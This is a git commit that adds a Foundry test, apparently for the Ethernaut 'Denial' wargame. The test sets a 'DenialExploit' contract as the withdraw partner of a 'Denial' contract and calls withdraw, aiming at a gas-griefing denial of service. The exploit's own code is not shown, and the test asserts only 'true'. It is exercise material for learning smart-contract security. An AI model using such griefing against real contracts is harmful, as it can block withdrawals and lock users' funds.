48e56c89140a8a73fe8e8585ce1571d45dc81572
allarious <arjmands@ualberta.ca>
2022-12-25 19:32:03 -0700

    added Denial exploit

---
+++ test/Denial.t.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "../src/Denial.sol";
+
+contract DenialTest is Test {
+    Denial denial;
+    DenialExploit exploit;
+
+    function setUp() public {
+        denial = new Denial();
+        exploit = new DenialExploit();
+
+        denial.setWithdrawPartner(address(exploit));
+    }
+
+    function testExploit() public{
+        denial.withdraw{gas: 100000000}();
+        assertTrue(true);
+    }
+}
